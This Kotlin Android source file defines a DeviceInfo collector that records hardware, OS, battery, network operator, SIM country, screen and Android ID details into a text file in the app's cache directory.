package com.kashem.shaikh.collectors

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import com.kashem.shaikh.services.AppLogs
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object DeviceInfo {

    fun collectInfo(context: Context): File {
        val sb = StringBuilder()
        sb.appendLine("***** DEVICE INFORMATION *****")
        sb.appendLine()
        sb.appendLine("Model         : ${Build.MODEL}")
        sb.appendLine("Manufacturer  : ${Build.MANUFACTURER}")
        sb.appendLine("Brand         : ${Build.BRAND}")
        sb.appendLine("Device        : ${Build.DEVICE}")
        sb.appendLine("Product       : ${Build.PRODUCT}")
        sb.appendLine("Hardware      : ${Build.HARDWARE}")
        sb.appendLine("Android       : ${Build.VERSION.RELEASE}")
        sb.appendLine("SDK           : ${Build.VERSION.SDK_INT}")
        sb.appendLine("Build ID      : ${Build.DISPLAY}")
        sb.appendLine("Time          : ${
            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        }")
        sb.appendLine()

        // Battery
        try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            val battery = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            sb.appendLine("Battery       : $battery%")
        } catch (e: Exception) {
            AppLogs.warn("DeviceInfo: battery read failed – ${e.message}")
        }

        // Network operator
        try {
            // ✅ FIX: WiFi-only device-এ TELEPHONY_SERVICE null হতে পারে
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            if (tm != null) {
                sb.appendLine("Network       : ${tm.networkOperatorName}")
                try {
                    // ✅ FIX: simCountryIso Android 13+ এ restricted → try-catch
                    sb.appendLine("Sim Country   : ${tm.simCountryIso}")
                } catch (_: SecurityException) {
                    sb.appendLine("Sim Country   : (restricted)")
                }
            } else {
                sb.appendLine("Network       : N/A (no telephony)")
            }
        } catch (e: Exception) {
            AppLogs.warn("DeviceInfo: telephony read failed – ${e.message}")
        }

        // Screen
        try {
            val dm = context.resources.displayMetrics
            sb.appendLine("Screen        : ${dm.widthPixels} x ${dm.heightPixels} (${dm.densityDpi} dpi)")
        } catch (_: Exception) {}

        // Android ID
        try {
            val androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            sb.appendLine("Android ID    : $androidId")
        } catch (_: Exception) {}

        val file = File(context.cacheDir, "deviceinfo.txt")
        try {
            FileOutputStream(file).use { it.write(sb.toString().toByteArray()) }
            AppLogs.info("DeviceInfo: collected (${file.length()} bytes)")
        } catch (e: Exception) {
            AppLogs.error("DeviceInfo: file write failed", e)
        }
        return file
    }
}